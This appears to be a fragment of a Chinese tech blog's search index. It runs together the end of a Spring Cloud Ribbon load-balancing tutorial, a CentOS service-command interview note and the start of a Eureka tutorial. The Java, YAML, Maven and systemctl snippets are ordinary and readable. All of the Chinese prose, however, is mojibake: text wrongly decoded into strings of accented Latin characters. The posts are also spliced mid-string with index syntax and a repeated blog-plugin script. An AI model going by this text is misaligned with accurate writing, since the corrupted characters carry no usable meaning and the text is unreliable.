ä¸Š @RibbonClient æ³¨è§£ï¼Œé…ç½®å†…å®¹è¡¨ç¤ºå¯¹ provider æœåŠ¡ä½¿ç”¨çš„ç­–ç•¥æ˜¯é€šè¿‡ RuleConfiguration ç±»æ‰€é…ç½®çš„ã€‚æ­¤å¤–è¿™é‡Œä½¿ç”¨ @ComponentScan æ³¨è§£çš„æ„æ€æ˜¯è®© Spring ä¸å»æ‰«æè¢« @AvoidScan æ³¨è§£æ ‡è®°çš„é…ç½®ç±»ï¼Œå› ä¸ºè¿™é‡Œçš„ç­–ç•¥é…ç½®æ˜¯å¸Œæœ›å¯¹å•ä¸ªæºæœåŠ¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸èƒ½åº”ç”¨äºå…¨å±€ã€‚è‹¥ä¸æƒ³ä½¿ç”¨ @AvoidScan æ³¨è§£ï¼Œåªè¦ä¿è¯ RuleConfiguration ç±» ä¸è¢« @ComponentScan æ³¨è§£æ‰«æåˆ°å°±è¡Œï¼Œç®€å•çš„åšæ³•å¯ä»¥å°† RuleConfiguration ç±»ä¸å­˜æ”¾åœ¨å¯åŠ¨ä¸»ç±»ï¼ˆRibbonLoadBalanceApplicationï¼‰æ‰€åœ¨çš„åŒ…åŠå…¶å­åŒ…ä¸‹ã€‚ç‰¹åˆ«æ³¨æ„ï¼šæ— è®ºæ˜¯åœ¨ Java ä»£ç ä¸­è¿˜æ˜¯ YML é…ç½®æ–‡ä»¶ä¸­ï¼Œåªè¦å¼•ç”¨åˆ°æœåŠ¡åç§°çš„åœ°æ–¹ï¼Œéƒ½éœ€è¦ä½¿ç”¨å¤§å†™è‹±æ–‡å­—ç¬¦çš„æœåŠ¡åç§°ï¼Œå¦åˆ™ä¼šæ‰¾ä¸åˆ°å¯¹åº”çš„æœåŠ¡æä¾›è€…ï¼Œå¯¼è‡´ç­–ç•¥çš„é…ç½®ä¸ç”Ÿæ•ˆ 12345678910@SpringBootApplication@EnableDiscoveryClient@RibbonClient(name = "PROVIDER", configuration = RuleConfiguration.class)@ComponentScan(excludeFilters = {@ComponentScan.Filter(type = FilterType.ANNOTATION, value = {AvoidScan.class})})public class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} è‹¥æƒ³å¯¹å¤šä¸ªæºæœåŠ¡æŒ‡å®šå¯¹åº”çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå¯ä»¥ä½¿ç”¨ @RibbonClients æ³¨è§£ 123456@RibbonClients(value = { @RibbonClient(name = "PROVIDER-USER", configuration = UserRuleConfiguration.class), @RibbonClient(name = "PROVIDER-DEPT", configuration = DeptRuleConfiguration.class)})public class RibbonLoadBalanceApplication {} åŸºäºé…ç½®æ–‡ä»¶çš„è‡ªå®šä¹‰ç­–ç•¥é…ç½®å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶æ¥å¯¹æºæœåŠ¡çš„è´Ÿè½½å‡è¡¡ç­–ç•¥è¿›è¡Œé…ç½®ï¼Œå…¶åŸºæœ¬è¯­æ³•æ˜¯ &lt;service name&gt;.ribbon.*ï¼Œä½¿ç”¨å®ƒå‡ ä¹å¯ä»¥ä¸ç”¨å†™æ³¨è§£å½¢å¼çš„ä»»ä½•é…ç½®ä»£ç ï¼Œä¸‹è¿°é…ç½®æ˜¯å¯¹ provider æœåŠ¡ä½¿ç”¨éšæœºç­–ç•¥ 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule åŒºåŸŸæƒè¡¡ç­–ç•¥çš„é…ç½®Ribbon é»˜è®¤å®ç°äº†åŒºåŸŸæƒè¡¡ç­–ç•¥ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ Eureka å®ä¾‹çš„å…ƒæ•°æ®é…ç½®æ¥å®ç°åŒºåŸŸåŒ–çš„å®ä¾‹é…ç½®æ–¹æ¡ˆã€‚Ribbon ä¼šä¼˜å…ˆè®¿é—®ä¸å®¢æˆ·ç«¯å¤„äºä¸€ä¸ª Zone ä¸­çš„æœåŠ¡ç«¯å®ä¾‹ï¼Œåªæœ‰å½“è¢«é€‰ä¸­çš„ Zone ä¸­æ²¡æœ‰å¯ç”¨çš„æœåŠ¡ç«¯å®ä¾‹çš„æ—¶å€™æ‰ä¼šè®¿é—®å…¶ä»– Zone ä¸­çš„æœåŠ¡ç«¯å®ä¾‹ã€‚å› æ­¤é€šè¿‡ zone å±æ€§çš„å®šä¹‰ï¼Œå°†å¤„äºä¸åŒæœºæˆ¿çš„å®ä¾‹é…ç½®æˆä¸åŒçš„åŒºåŸŸå€¼ï¼Œé…åˆå®é™…éƒ¨ç½²çš„ç‰©ç†ç»“æ„ï¼Œå¯ä»¥æœ‰æ•ˆåœ°è®¾è®¡å‡ºé’ˆå¯¹åŒºåŸŸæ€§æ•…éšœçš„å®¹é”™é›†ç¾¤ã€‚è€Œå®ç°çš„æ–¹å¼éå¸¸ç®€å•ï¼Œåªéœ€åœ¨ Eureka çš„æœåŠ¡å®ä¾‹çš„å…ƒæ•°æ®ä¸­å¢åŠ  zone å‚è€ƒæ¥æŒ‡å®šè‡ªå·±æ‰€åœ¨çš„åŒºåŸŸï¼Œä¸‹è¿°å†…å®¹æ˜¯é…ç½®åœ¨ Eureka çš„æœåŠ¡å®ä¾‹ä¸­ï¼š 1234eureka: instance: metadata-map: zone: shanghai Ribbon é…ç½®å®æˆ˜Ribbon è¶…æ—¶ä¸é‡è¯•ä½¿ç”¨ HTTP å‘èµ·è¯·æ±‚ï¼Œå…ä¸äº†é‡åˆ°æç«¯ç¯å¢ƒï¼Œæ­¤æ—¶å¯¹è°ƒç”¨è¿›è¡Œæ—¶é™æ§åˆ¶ä»¥åŠæ—¶é™ä¹‹åçš„é‡è¯•å°¤ä¸ºé‡è¦ã€‚åœ¨ Spring Cloud çš„ Brixtion ç‰ˆæœ¬ä¸­ï¼Œå¯¹äºé‡è¯•æœºåˆ¶çš„å®ç°éœ€è¦å¼€å‘è€…è‡ªè¡Œæ‰©å±•å®ç°ï¼Œè€Œä» Camden SR2 ç‰ˆæœ¬å¼€å§‹ï¼ŒSpring Cloud æ•´åˆäº† Spring Retry æ¥å¢åŠ  RestTemplate çš„é‡è¯•èƒ½åŠ›ï¼Œåªéœ€è¦é€šè¿‡ç®€å•çš„é…ç½®ï¼ŒåŸæ¥é‚£äº›é€šè¿‡ RestTemplate å®ç°çš„æœåŠ¡è®¿é—®å°±ä¼šè‡ªåŠ¨æ ¹æ®é…ç½®æ¥å®ç°é‡è¯•æœºåˆ¶ã€‚æ³¨æ„ï¼ŒFinchley ç‰ˆä¸­ Ribbon çš„é‡è¯•æœºåˆ¶é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œåªéœ€è¦æ·»åŠ é’ˆå¯¹è¶…æ—¶æ—¶é—´ä¸é‡è¯•ç­–ç•¥çš„é…ç½®å³å¯ã€‚ä¸‹è¿°é…ç½®æ˜¯å¯¹ provider æœåŠ¡é…ç½®è¶…æ—¶ä¸é‡è¯•ç›¸å…³å‚æ•°ï¼š 12345678PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #å¯¹ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æœåŠ¡çš„é‡è¯•æ¬¡æ•° MaxAutoRetriesNextServer: 1 #è¦é‡è¯•çš„ä¸‹ä¸€ä¸ªæœåŠ¡çš„æœ€å¤§æ•°é‡ï¼ˆä¸åŒ…æ‹¬ç¬¬ä¸€ä¸ªæœåŠ¡ï¼‰ OkToRetryOnAllOperations: true NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon çš„é¥¥é¥¿åŠ è½½Ribbon åœ¨è¿›è¡Œå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡çš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯å¯åŠ¨æ—¶å°±åŠ è½½ä¸Šä¸‹æ–‡çš„ï¼Œè€Œæ˜¯åœ¨å®é™…è¯·æ±‚çš„æ—¶å€™æ‰å»åˆ›å»ºï¼Œå› æ­¤è¿™ä¸ªç‰¹æ€§å¾€å¾€ä¼šè®©ç¬¬ä¸€æ¬¡è°ƒç”¨æ˜¾å¾—ç–²è½¯ä¹åŠ›ï¼Œä¸¥é‡çš„æ—¶å€™ä¼šå¼•èµ·è°ƒç”¨è¶…æ—¶ã€‚æ­¤æ—¶å¯ç”¨é€šè¿‡æŒ‡å®š Ribbon å…·ä½“çš„å®¢æˆ·ç«¯çš„åç§°æ¥å¼€å¯é¥¥é¥¿åŠ è½½ï¼Œå³åœ¨å¯åŠ¨çš„æ—¶å€™ä¾¿åŠ è½½æ‰€æœ‰é…ç½®é¡¹çš„åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ã€‚ 1234ribbon: eager-load: enabled: true clients: PROVIDER-USER, PROVIDER-DEPT, PROVIDER-ORDER åŸºäºé…ç½®æ–‡ä»¶è‡ªå®šä¹‰ Ribbon å®¢æˆ·ç«¯Ribbon åœ¨ 1.2.0 ç‰ˆæœ¬ä¹‹åï¼Œæ”¯æŒä½¿ç”¨é…ç½®æ–‡ä»¶æ¥å®šåˆ¶ Ribbon å®¢æˆ·ç«¯ï¼Œå…¶å®è´¨å°±æ˜¯ä½¿ç”¨é…ç½®æ–‡ä»¶æ¥æŒ‡å®šä¸€äº›é»˜è®¤åŠ è½½ç±»ï¼Œä»è€Œæ›´æ”¹ Ribbon å®¢æˆ·ç«¯çš„é»˜è®¤è¡Œä¸ºæ–¹å¼ï¼Œå¹¶ä¸”è¿™ç§æ–¹æ³•çš„ä¼˜å…ˆçº§æ˜¯æœ€é«˜çš„ï¼Œä¼˜å…ˆçº§é«˜äºä½¿ç”¨æ³¨è§£ @RibbonClient æŒ‡å®šçš„é…ç½®å’Œ Java æºç ä¸­åŠ è½½çš„ç›¸å…³ Beanï¼Œå…·ä½“é…ç½®è§„åˆ™å¦‚ä¸‹ï¼š ä¸‹è¿°é…ç½®ï¼Œè¡¨ç¤ºæ˜¯å¯¹ provider æœåŠ¡ä½¿ç”¨éšæœºç­–ç•¥ 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon è„±ç¦» Eureka çš„ä½¿ç”¨åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒRibbon å®¢æˆ·ç«¯ä¼šä» Eureka æ³¨å†Œä¸­å¿ƒè¯»å–æœåŠ¡æ³¨å†Œä¿¡æ¯åˆ—è¡¨ï¼Œæ¥è¾¾åˆ°åŠ¨æ€è´Ÿè½½å‡è¡¡çš„ç›®çš„ã€‚è‹¥ä¸æƒ³ä» Eureka æ³¨å†Œä¸­å¿ƒè¯»å–æœåŠ¡æ³¨å†Œåˆ—è¡¨ï¼Œå¯ä»¥é…ç½® Ribbon å®¢æˆ·ç«¯ä½¿ç”¨æŒ‡å®šçš„æºæœåŠ¡åœ°å€ï¼Œè®© Ribbon è„±ç¦» Eureka ä½¿ç”¨ï¼Œé…ç½®å®ä¾‹å¦‚ä¸‹ï¼š 1234567ribbon: eureka: enabled: false #ç¦ç”¨Eurekaçš„åŠŸèƒ½PROVIDER: ribbon: listOfServers: http://127.0.0.1:7000, http://127.0.0.1:7001 #æŒ‡å®šprovideræœåŠ¡çš„æœåŠ¡åœ°å€ Ribbon è¿›é˜¶æ ¸å¿ƒæ¥å£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Linux è¿ç»´é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/fe7d7b9d.html",text:'LinuxCentos 6ã€7 çš„æœåŠ¡ç±»ç›¸å…³å‘½ä»¤ Centos 6 æ³¨å†Œåœ¨ç³»ç»Ÿä¸­çš„æ ‡å‡†åŒ–ç¨‹åº ç»Ÿä¸€çš„ç®¡ç†æ–¹å¼ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰ service æœåŠ¡å start service æœåŠ¡å stop service æœåŠ¡å restart service æœåŠ¡å status æŸ¥çœ‹æœåŠ¡çš„æ–¹æ³•ï¼š /etc/init.d/æœåŠ¡å é€šè¿‡ chkconfig å‘½ä»¤ç®¡ç†æœåŠ¡è‡ªå¯åŠ¨ æŸ¥çœ‹è‡ªå¯åŠ¨çš„æœåŠ¡ï¼š chkconfig --list|grep xxx å¯ç”¨æœåŠ¡è‡ªå¯åŠ¨ï¼š chkconfig --level 5 æœåŠ¡å on å…³é—­æœåŠ¡è‡ªå¯åŠ¨ï¼š chkconfig --level 5 æœåŠ¡å off Centos 7 æ³¨å†Œåœ¨ç³»ç»Ÿä¸­çš„æ ‡å‡†åŒ–ç¨‹åº ç»Ÿä¸€çš„ç®¡ç†æ–¹å¼ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰ systemctl start æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl stop æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl restart æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl reload æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl status æœåŠ¡åï¼ˆxxx.serviceï¼‰ æŸ¥çœ‹æœåŠ¡çš„æ–¹æ³•ï¼š /usr/lib/systemd/system/æœåŠ¡å æŸ¥çœ‹æœåŠ¡çš„å‘½ä»¤ systemctl list-unit-files | grep service_name systemctl --type service | grep service_name é€šè¿‡ systemctl å‘½ä»¤ç®¡ç†æœåŠ¡è‡ªå¯åŠ¨ å¯ç”¨æœåŠ¡è‡ªå¯åŠ¨ï¼š systemctl enable service_name å…³é—­æœåŠ¡è‡ªå¯åŠ¨ï¼š systemctl disable service_name var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Eureka å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/be1e11c7.html",text:'Eureka ä»‹ç»Eureka æ˜¯ä»€ä¹ˆEureka æ˜¯ Netflix å¼€å‘çš„ä¸€æ¬¾åŸºäº HTTP REST çš„æœåŠ¡ï¼Œç”± Pivotal å…¬å¸å°†å…¶æ•´åˆè¿› Spring Cloud ç”Ÿæ€ã€‚Netflix åœ¨è®¾è®¡ Eureka æ—¶éµå®ˆçš„æ˜¯ AP åŸåˆ™ï¼Œé€šå¸¸ç”¨äºæœåŠ¡æ³¨å†Œå‘ç°ã€è´Ÿè½½å‡è¡¡å’Œæ•…éšœè½¬ç§»ç­‰ï¼Œä¹Ÿæ˜¯ Spring Cloud ä¸­ä½¿ç”¨çš„æœåŠ¡æ³¨å†Œå‘ç°ç»„ä»¶ã€‚Eureka é‡‡ç”¨ C/S æ¶æ„ï¼Œæä¾›äº†ä¸€ä¸ªåŸºäº Java çš„ Client ç»„ä»¶ï¼Œç”¨æ¥ä¸æœåŠ¡ç«¯äº¤äº’ï¼ŒåŒæ—¶å…·æœ‰ä¸€å¥—å†…ç½®çš„è´Ÿè½½å‡è¡¡å™¨ï¼Œå¯ä»¥è¿›è¡ŒåŸºæœ¬çš„è½®è¯¢è´Ÿè½½å‡è¡¡ã€‚Eureka ä» 2012 å¹´ 9 æœˆåœ¨ Github ä¸Šå‘å¸ƒ 1.1.2 ç‰ˆæœ¬ä»¥æ¥ï¼Œè‡³ä»Šå·²ç»å‘å¸ƒäº† 231 æ¬¡ï¼Œæœ€æ–°ç‰ˆæœ¬ä¸º 2020 å¹´ 4 æœˆä»½å‘å¸ƒçš„ 1.9.20 ç‰ˆæœ¬ã€‚æœŸé—´æœ‰è¿›è¡Œ 2.x ç‰ˆæœ¬çš„å¼€å‘ï¼Œä¸è¿‡ç”±äºå„ç§åŸå› å†…éƒ¨å·²ç»å†»ç»“å¼€å‘ï¼Œç›®å‰è¿˜æ˜¯ä»¥ 1.x ç‰ˆæœ¬ä¸ºä¸»ã€‚æ›´å¤šä»‹ç»å¯å‚è€ƒï¼šEureka é¡¹ç›®ã€Eureka å®˜æ–¹è‹±æ–‡æ–‡æ¡£ã€Spring Cloud Eureka å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Eureka æœåŠ¡æ²»ç†ä½“ç³» Eureka æœåŠ¡çš„ä¸‰ä¸ªè§’è‰² æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼šEureka æä¾›çš„æœåŠ¡ç«¯ï¼Œæä¾›æœåŠ¡æ³¨å†Œä¸å‘ç°çš„åŠŸèƒ½ï¼Œä¸€èˆ¬è¢«ç§°ä½œ Eureka-Serverï¼› æœåŠ¡æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹è€…åº”ç”¨ä»æœåŠ¡æ³¨å†Œä¸­å¿ƒè·å–æœåŠ¡åˆ—è¡¨ï¼Œä»è€Œä½¿æ¶ˆè´¹è€…å¯ä»¥çŸ¥é“å»ä½•å¤„è°ƒç”¨å…¶æ‰€éœ€è¦çš„æœåŠ¡ï¼› æœåŠ¡æä¾›è€…ï¼šæä¾›æœåŠ¡çš„åº”ç”¨ï¼Œå¯ä»¥æ˜¯ Spring Boot åº”ç”¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–æŠ€æœ¯å¹³å°ä¸”éµå¾ª Eureka é€šä¿¡æœºåˆ¶çš„åº”ç”¨ã€‚å®ƒå°†è‡ªå·±æä¾›çš„æœåŠ¡æ³¨å†Œåˆ° Eurekaï¼Œä»¥ä¾›å…¶ä»–åº”ç”¨å‘ç°ã€‚ Eureka é«˜å¯ç”¨æ€§Eureka çš„é«˜å¯ç”¨æ€§Eureka çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œå®ƒå’Œå…¶ä»–æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸€æ ·ï¼Œæ”¯æŒé«˜å¯ç”¨é…ç½®ã€‚ä¾æ‰˜äºå¼ºä¸€è‡´æ€§æä¾›è‰¯å¥½çš„æœåŠ¡å®ä¾‹å¯ç”¨æ€§ï¼Œå¯ä»¥åº”å¯¹å¤šç§ä¸åŒçš„æ•…éšœåœºæ™¯ã€‚Eureka æœåŠ¡ç«¯æ”¯æŒé›†ç¾¤æ¨¡å¼éƒ¨ç½²ï¼Œå½“é›†ç¾¤ä¸­æœ‰åˆ†ç‰‡å‘ç”Ÿæ•…éšœçš„æ—¶å€™ï¼ˆè¶…è¿‡ 85% çš„æœåŠ¡å®ä¾‹ä¸¢å¤±å¿ƒè·³ï¼‰ï¼ŒEureka ä¼šè‡ªåŠ¨è½¬å…¥è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚å®ƒå…è®¸åœ¨åˆ†ç‰‡å‘ç”Ÿæ•…éšœçš„æ—¶å€™ç»§ç»­æä¾›æœåŠ¡çš„å‘ç°å’Œæ³¨å†Œï¼Œå½“æ•…éšœæ¢å¤æ—¶ï¼Œé›†ç¾¤ä¸­çš„å…¶ä»–åˆ†ç‰‡ä¼šæŠŠå„è‡ªçš„çŠ¶æ€å†æ¬¡åŒæ­¥å›æ¥ã€‚é›†ç¾¤ä¸­çš„çš„ä¸åŒæœåŠ¡æ³¨å†Œä¸­å¿ƒé€šè¿‡å¼‚æ­¥æ¨¡å¼äº’ç›¸å¤åˆ¶å„è‡ªçš„çŠ¶æ€ï¼Œè¿™ä¹Ÿæ„å‘³ç€åœ¨ç»™å®šçš„æ—¶é—´ç‚¹æ¯ä¸ªå®ä¾‹å…³äºæ‰€æœ‰æœåŠ¡çš„çŠ¶æ€å¯èƒ½å­˜åœ¨ä¸ä¸€è‡´çš„ç°è±¡ã€‚ Eureka çš„è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœ Eureka Server åœ¨ä¸€å®šæ—¶é—´å†…ï¼ˆé»˜è®¤ 90 ç§’ï¼‰æ²¡æœ‰æ¥æ”¶åˆ°æŸä¸ªå¾®æœåŠ¡å®ä¾‹çš„å¿ƒè·³ï¼ŒEureka Server å°†ä¼šæ³¨é”€è¯¥å®ä¾‹ã€‚ä½†æ˜¯å½“ç½‘ç»œåˆ†åŒºæ•…éšœå‘ç”Ÿæ—¶ï¼Œå¾®æœåŠ¡ä¸ Eureka Server ä¹‹é—´æ— æ³•æ­£å¸¸é€šä¿¡ï¼Œè¿™å°±å¯èƒ½å˜å¾—éå¸¸å±é™©äº†ã€‚å› ä¸ºå¾®æœåŠ¡æœ¬èº«æ˜¯å¥åº·çš„ï¼Œæ­¤æ—¶æœ¬ä¸åº”è¯¥æ³¨é”€è¿™ä¸ªå¾®æœåŠ¡ã€‚Eureka Server é€šè¿‡ â€œè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼â€ æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå½“ Eureka Server èŠ‚ç‚¹åœ¨çŸ­æ—¶é—´å†…ä¸¢å¤±è¿‡å¤šå®¢æˆ·ç«¯æ—¶ï¼ˆè¶…è¿‡ 85% çš„æœåŠ¡å®ä¾‹ä¸¢å¤±å¿ƒè·³ï¼Œå¯èƒ½å‘ç”Ÿäº†ç½‘ç»œåˆ†åŒºæ•…éšœï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªèŠ‚ç‚¹å°±ä¼šè¿›å…¥è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚ä¸€æ—¦è¿›å…¥è¯¥æ¨¡å¼ï¼ŒEureka Server å°±ä¼šä¿æŠ¤æœåŠ¡æ³¨å†Œè¡¨ä¸­çš„ä¿¡æ¯ï¼Œä¸å†åˆ é™¤æœåŠ¡æ³¨å†Œè¡¨ä¸­çš„æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯ä¸ä¼šæ³¨é”€ä»»ä½•å¾®æœåŠ¡ï¼‰ã€‚å½“ç½‘ç»œæ•…éšœæ¢å¤åï¼Œè¯¥ Eureka Server èŠ‚ç‚¹ä¼šè‡ªåŠ¨é€€å‡ºè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼æ˜¯ä¸€ç§å¯¹ç½‘ç»œå¼‚å¸¸çš„å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œä½¿ç”¨è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ï¼Œå¯ä»¥è®© Eureka é›†ç¾¤æ›´åŠ çš„å¥å£®ã€ç¨³å®šã€‚ åœ¨è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ä¸­ï¼ŒEureka Server ä¼šä¿æŠ¤æ³¨å†Œè¡¨ä¸­çš„ä¿¡æ¯ï¼Œä¸å†æ³¨é”€ä»»ä½•æœåŠ¡å®ä¾‹ã€‚å½“å®ƒæ”¶åˆ°çš„å¿ƒè·³æ•°é‡æ–°æ¢å¤åˆ°é˜€å€¼ä»¥ä¸Šæ—¶ï¼Œè¯¥ Eureka Server èŠ‚ç‚¹å°±ä¼šè‡ªåŠ¨é€€å‡ºè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚å®ƒçš„è®¾è®¡å“²å­¦å°±æ˜¯å®å¯ä¿ç•™é”™è¯¯çš„æœåŠ¡æ³¨å†Œä¿¡æ¯ï¼ˆå¥åº·æˆ–ä¸å¥åº·çš„å¾®æœåŠ¡éƒ½ä¼šä¿ç•™ï¼‰ï¼Œä¹Ÿä¸ç›²ç›®æ³¨é”€ä»»ä½•å¯èƒ½å¥åº·çš„æœåŠ¡å®ä¾‹ã€‚åœ¨ Spring Cloud ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ eureka.server.enable-self-preservation: false æ¥ç¦ç”¨è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚ Eureka è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼çš„æ•ˆæœ Eureka ä¸å†ä»æ³¨å†Œåˆ—è¡¨ç§»é™¤å› é•¿æ—¶é—´æ²¡æ”¶åˆ°å¿ƒè·³è€Œåº”è¯¥è¿‡æœŸçš„æœåŠ¡ Eureka ä»ç„¶èƒ½å¤Ÿæ¥å—æ–°æœåŠ¡çš„æ³¨å†Œå’ŒæŸ¥è¯¢è¯·æ±‚ï¼Œä½†æ˜¯ä¸ä¼šè¢«åŒæ­¥åˆ°å…¶ä»–èŠ‚ç‚¹ï¼ˆé«˜å¯ç”¨ï¼‰ Eureka åœ¨ç½‘ç»œç¨³å®šçš„æ—¶å€™ï¼Œå½“å‰å®ä¾‹æ–°çš„æ³¨å†Œä¿¡æ¯ä¼šè¢«åŒæ­¥åˆ°å…¶ä»–èŠ‚ç‚¹ä¸­ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ Eureka å¯ä»¥å¾ˆå¥½çš„åº”å¯¹å› ç½‘ç»œæ•…éšœå¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹å¤±å»è”ç³»çš„æƒ…å†µï¼Œè€Œä¸ä¼šåƒ ZooKeeper ä¸€æ ·ä½¿å¾—æ•´ä¸ªæ³¨å†Œä¸­å¿ƒç˜«ç—ª Eureka çš„å¥åº·æ£€æŸ¥åœ¨ Eureka ä¸­ï¼Œå¾®æœåŠ¡çŠ¶æ€å¯å–å€¼ä¸º DOWNã€OUT_OF_SERVICEã€UNKNOWN ç­‰ï¼Œåªæœ‰ UP çš„å¾®æœåŠ¡ä¼šè¢«è¯·æ±‚ã€‚ç”±äº Eureka Server ä¸ Eureka Client ä¹‹é—´ä½¿ç”¨å¿ƒè·³æœºåˆ¶æ¥ç¡®å®š Eureka Client çš„çŠ¶æ€ï¼Œé»˜è®¤æƒ…å†µä¸‹æœåŠ¡å™¨ç«¯ä¸å®¢æˆ·ç«¯çš„å¿ƒè·³ä¿æŒæ­£å¸¸ï¼Œåº”ç”¨ç¨‹åºå°±ä¼šå§‹ç»ˆä¿æŒ UP çŠ¶æ€ï¼Œæ‰€ä»¥å¾®æœåŠ¡çš„ UP å¹¶ä¸èƒ½å®Œå…¨ååº”åº”ç”¨ç¨‹åºçš„çŠ¶æ€ã€‚Spring Boot Actuator æä¾›äº† /health ç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹å¯å±•ç¤ºåº”ç”¨ç¨‹åºçš„å¥åº·ä¿¡æ¯ï¼Œåªè¦å°†è¯¥ç«¯ç‚¹ä¸­çš„å¥åº·çŠ¶æ€ä¼ æ’­åˆ° Eureka Server å°±å¯ä»¥äº†ï¼Œå®ç°è¿™ç‚¹å¾ˆç®€å•ï¼Œåªéœ€ä¸ºå¾®æœåŠ¡é…ç½®å¦‚ä¸‹å†…å®¹å³å¯ã€‚å¦‚æœéœ€è¦æ›´ç»†ç²’åº¦å¥åº·æ£€æŸ¥ï¼Œå¯å®ç° com.netflix.appinfo.HealthCheckHandler æ¥å£ï¼ŒEurekaHealthCheckHandler å·²å®ç°äº†è¯¥æ¥å£ã€‚ 12# å¼€å¯å¥åº·æ£€æŸ¥ï¼ˆéœ€è¦æ·»åŠ spring-boot-starter-actuatorä¾èµ–ï¼‰eureka.client.healthcheck.enabled = true Eureka å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜ä»¥ä¸‹æ¡ˆä¾‹ä½¿ç”¨äº†ç‰ˆæœ¬è¾ƒæ—§çš„ SpringCloud-Dalston.SR1 + SpringBoot-1.5.9.RELEASEï¼Œé…ç½®æ–¹å¼è·Ÿæœ€æ–°ç‰ˆæœ¬çš„ SpringCloud æœ‰ä¸€å®šçš„åŒºåˆ« 2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324&lt;properties&gt; &lt;springcloud.version&gt;Dalston.SR1&lt;/springcloud.version&gt; &lt;springboot.version&gt;1.5.9.RELEASE&lt;/springboot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${springboot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; 